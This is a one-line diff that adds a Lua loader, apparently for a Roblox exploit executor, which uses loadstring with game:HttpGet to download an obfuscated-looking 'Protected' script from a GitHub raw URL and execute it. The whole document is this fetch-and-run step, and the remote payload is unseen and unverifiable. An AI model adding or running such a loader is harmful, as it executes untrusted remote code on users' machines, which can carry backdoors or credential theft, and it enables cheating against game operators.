@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bitcoinberrylua/fluxuniversal/refs/heads/main/Protected_1858789522967292.txt",true))()
